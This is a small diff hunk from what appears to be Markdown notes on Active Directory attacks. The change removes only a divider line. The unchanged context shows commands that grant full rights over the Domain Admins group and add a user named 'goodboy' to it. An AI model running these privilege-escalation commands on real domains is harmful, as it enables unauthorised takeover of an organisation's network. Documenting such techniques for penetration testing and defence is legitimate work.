@@ -14,7 +14,6 @@ Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIden
 net group "domain admins" goodboy /add /domain
 ```
 
-------------------------------------------------------------------------------------------------------------
 ## Import the AD module (requires RSAT or AD PowerShell tools)
 ```bash
 Import-Module ActiveDirectory
